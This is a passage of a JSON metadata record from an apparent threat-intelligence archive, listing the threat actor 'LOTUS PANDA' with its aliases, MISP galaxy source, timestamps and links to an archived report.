            "created_at": "2023-01-06T13:46:38.293223Z",
            "updated_at": "2025-03-27T02:00:02.796483Z",
            "deleted_at": null,
            "main_name": "LOTUS PANDA",
            "aliases": [
                "Lotus BLossom",
                "Spring Dragon",
                "ST Group",
                "DRAGONFISH",
                "BRONZE ELGIN",
                "ATK1",
                "G0030",
                "Red Salamander"
            ],
            "source_name": "MISPGALAXY:LOTUS PANDA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041628,
    "ts_creation_date": 1454974262,
    "ts_modification_date": 1454974262,
    "files": {
        "pdf": "https://archive.orkl.eu/777fc2e7355924588a27d693cdfcc31bcf8ec76b.pdf",
        "text": "https://archive.orkl.eu/777fc2e7355924588a27d693cdfcc31bcf8ec76b.txt",
        "img": "https://archive.orkl.eu/777fc2e7355924588a27d693cdfcc31bcf8ec76b.jpg"
    }
}